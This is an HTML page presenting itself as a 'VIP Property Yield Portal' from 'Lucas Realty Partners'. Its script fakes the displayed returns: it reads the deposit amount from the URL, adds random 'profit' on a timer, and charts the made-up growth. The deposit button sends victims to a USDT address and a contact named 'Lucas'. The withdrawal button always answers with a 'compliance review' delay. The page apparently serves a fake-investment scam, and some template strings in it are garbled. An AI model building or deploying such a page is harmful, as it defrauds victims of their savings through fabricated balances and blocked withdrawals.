<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>VIP Property Yield Portal</title>
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <style>
    body {
      margin: 0; padding: 20px; font-family: -apple-system, BlinkMacOSystemFont, sans-serif;
      background: linear-gradient(135deg, #0d1117, #161b22); color: #e6edf3;
    }
    .container { max-width: 480px; margin: 0 auto; }
    h1 { font-size: 1.8rem; margin-bottom: 8px; color: #58a6ff; }
    .balance-box {
      background: #21262d; border-radius: 12px; padding: 20px; margin: 16px 0;
      text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.4);
    }
    .balance { font-size: 2.4rem; font-weight: bold; color: #00ff9d; }
    .label { color: #8b949e; font-size: 0.95rem; }
    .profit-log { margin: 20px 0; background: #161b22; border-radius: 10px; padding: 12px; }
    .entry { padding: 8px 0; border-bottom: 1px solid #30363d; color: #a5d6ff; }
    button {
      background: #238636; color: white; border: none; padding: 14px;
      font-size: 1.1rem; border-radius: 8px; width: 100%; margin: 16px 0;
      cursor: pointer;
    }
    button:hover { background: #2ea043; }
    #status { color: #ffa657; font-size: 0.9rem; text-align: center; }
  </style>
</head>
<body>
  <div class="container">
    <h1 id="welcome">Welcome back</h1>
    <div class="balance-box">
      <div class="label">Total Portfolio Value</div>
      <div class="balance" id="balance">$0.00</div>
      <div class="label" id="change">+0.00% today</div>
    </div>

    <canvas id="chartCanvas" height="180"></canvas>

    <div class="profit-log" id="log"></div>

    <button id="depositBtn">Add More Funds (USDT)</button>
    <button id="withdrawBtn">Request Withdrawal</button>

    <div id="status">Live market update • Powered by Lucas Realty Partners</div>
  </div>

  <script>
    const STORAGE_KEY = 'vip_portfolio_state';
    let state = JSON.parse(localStorage.getItem(STORAGE_KEY)) || {
      initialDeposit: 0,
      currentBalance: 0,
      history: [],
      lastUpdate: Date.now(),
      name: 'Investor'
    };

    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('name')) state.name = urlParams.get('name');
    if (urlParams.has('deposit') && state.initialDeposit === 0) {
      state.initialDeposit = parseFloat(urlParams.get('deposit')) || 500;
      state.currentBalance = state.initialDeposit;
      state.history = [state.initialDeposit];
    }

    document.getElementById('welcome').textContent = `Welcome back, ${state.name}`;

    const ctx = document.getElementById('chartCanvas').getContext('2d');
    const chart = new Chart(ctx, {
      type: 'line',
      data: { labels: [], datasets: [{ label: 'Value (USDT)', data: [], borderColor: '#00ff9d', tension: 0.35, fill: false }] },
      options: {
        responsive: true, scales: { y: { beginAtZero: false }, x: { display: false } },
        plugins: { legend: { display: false } }
      }
    });

    function simulateProfit() {
      const now = Date.now();
      const minutesPassed = (now - state.lastUpdate) / 60000;

      let simulatedGain = minutesPassed * (Math.random() * 0.08 + 0.04);
      if (simulatedGain > 12) simulatedGain = 12;

      const gainPct = simulatedGain / 100;
      const oldBal = state.currentBalance;
      state.currentBalance *= (1 + gainPct);
      state.currentBalance = Math.round(state.currentBalance * 100) / 100;

      const dailyChange = ((state.currentBalance - oldBal) / oldBal * 100).toFixed(2);
      document.getElementById('change').textContent = `+${dailyChange}% today`;

      state.history.push(state.currentBalance);
      if (state.history.length > 30) state.history.shift();

      chart.data.labels = state.history.map((_, i) => i);
      chart.data.datasets[0].data = state.history;
      chart.update();

      const log = document.getElementById('log');
      const entry = document.createElement('div');
      entry.className = 'entry';
      entry.textContent = `[\( {new Date().toLocaleTimeString()}] Portfolio yield + \){(gainPct*100).toFixed(2)}% • New value: \[ {state.currentBalance.toFixed(2)}`;
      log.prepend(entry);
      if (log.children.length > 8) log.removeChild(log.lastChild);

      state.lastUpdate = now;
      localStorage.setItem(STORAGE_KEY, JSON.stringify(state));

      document.getElementById('balance').textContent = ` \]{state.currentBalance.toFixed(2)}`;
    }

    simulateProfit();
    setInterval(simulateProfit, Math.random() * 12000 + 6000);

    document.getElementById('depositBtn').onclick = () => {
      alert("Send USDT-TRC20 to this address to top up:\nTxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n(Contact Lucas for confirmation ❤️)");
    };

    document.getElementById('withdrawBtn').onclick = () => {
      alert("Withdrawal request submitted.\nDue to current compliance review, processing may take 48–72 hours.\nWe'll notify you the moment funds are released.");
    };
  </script>
</body>
</html>
